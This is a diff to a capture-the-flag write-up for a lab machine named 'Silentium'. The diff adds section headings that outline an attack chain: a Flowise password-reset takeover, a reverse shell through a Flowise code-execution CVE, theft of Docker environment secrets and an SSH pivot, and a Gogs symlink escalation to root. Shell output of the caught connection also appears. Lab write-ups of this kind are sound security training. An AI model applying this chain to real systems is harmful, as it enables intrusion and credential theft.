@@ -141,6 +141,8 @@ curl -s http://staging.silentium.htb/api/v1/version
 
 ## Step 2 - Initial Foothold
 
+### Flowise Account Takeover via Leaked Password Reset Token
+
 - 🔍 *We need a valid user email address to trigger the forgot-password flow. The main site leadership section lists: `Marcus Throne`, `Ben`, and `Elena Rossi`. We guess the emails and test them against the API:*
 
 ```bash
@@ -187,6 +189,8 @@ Content-Length: 579
 ```
 
 - 🔍 *We capture a valid `tempToken` for `ben@silentium.htb`. We use this token to update the account password via the password reset portal, and log in.*
+### Flowise CustomMCP Arbitrary Code Execution (CVE-2025-59528)
+
 - 🔍 *Now authenticated, we exploit the CustomMCP node RCE (CVE-2025-59528) to trigger a reverse shell:*
 
 ```bash
@@ -213,6 +217,8 @@ connect to [10.10.14.253] from (UNKNOWN) [10.129.37.52] 33587
 # whoami
 root
 ```
+
+### Docker Environment Secret Extraction & Host SSH Pivot
 
 - 🔍 *We are running as root inside a Docker container. Let's dump the environment variables:*
 
@@ -268,6 +274,8 @@ ben@silentium:~$
 ---
 
 ## Step 3 - Privilege Escalation
+
+### Gogs Symlink Validation Bypass to Root (CVE-2025-8110)
 
 - 🔍 *We check our sudo permissions but discover we cannot run sudo:*
 
